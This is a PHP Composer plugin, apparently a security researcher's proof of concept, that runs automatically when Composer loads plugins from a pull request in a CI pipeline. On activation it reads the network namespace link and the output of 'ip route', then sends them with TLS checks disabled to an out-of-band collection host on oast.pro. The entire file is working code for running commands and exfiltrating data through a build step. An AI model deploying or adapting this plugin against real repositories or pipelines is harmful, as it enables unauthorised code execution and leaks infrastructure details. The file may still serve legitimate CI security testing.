<?php
// H238 plugin probe (run 2) — own test repo. Activated only if the Composer
// setup step loads plugins from the PR head. Sends exactly one out-of-band GET
// carrying the event tag, the netns link target and `ip route` output.
namespace H238;

use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;

class ProbePlugin implements PluginInterface
{
    public function activate(Composer $composer, IOInterface $io)
    {
        $ns = @readlink('/proc/self/ns/net');
        if ($ns === false || $ns === null) {
            $ns = 'ERR';
        }
        $route = '';
        if (function_exists('shell_exec')) {
            $route = (string)@shell_exec('ip route 2>&1');
        }
        if (trim($route) === '' && function_exists('exec')) {
            $lines = array();
            @exec('ip route 2>&1', $lines);
            $route = implode(' | ', $lines);
        }
        $q = http_build_query(array(
            'event' => 'composer-plugin',
            'ns' => $ns,
            'route' => substr($route, 0, 900),
        ));
        $url = 'https://dc2iuv8o5v1mkjesnfog31pzf7rc7wqsn.oast.pro/h238b/plugin?' . $q;
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            @curl_setopt_array($ch, array(
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 6,
                CURLOPT_CONNECTTIMEOUT => 4,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_USERAGENT => 'h238b-composer-plugin-probe',
            ));
            @curl_exec($ch);
            @curl_close($ch);
        } elseif (function_exists('file_get_contents')) {
            $ctx = stream_context_create(array(
                'http' => array(
                    'method' => 'GET',
                    'timeout' => 6,
                    'user_agent' => 'h238b-composer-plugin-probe',
                    'ignore_errors' => true,
                ),
                'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
            ));
            @file_get_contents($url, false, $ctx);
        }
        $io->writeError('[h238b-plugin] activated');
    }

    public function deactivate(Composer $composer, IOInterface $io)
    {
    }

    public function uninstall(Composer $composer, IOInterface $io)
    {
    }
}
